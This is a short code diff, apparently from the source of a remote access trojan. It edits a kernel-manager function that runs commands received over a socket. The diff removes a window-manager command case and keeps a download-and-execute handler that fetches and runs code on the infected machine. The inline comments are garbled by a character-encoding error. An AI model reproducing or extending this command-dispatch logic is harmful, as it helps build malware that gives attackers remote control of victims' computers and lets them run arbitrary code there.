@@ -83,11 +83,6 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
 
-	case COMMAND_WSLIST:       //¥∞ø⁄
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_WindowManager,
-			(LPVOID)m_pClient->m_Socket, 0, NULL);
-		break;
-
 	case COMMAND_DOWN_EXEC: // œ¬‘ÿ’ﬂ
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
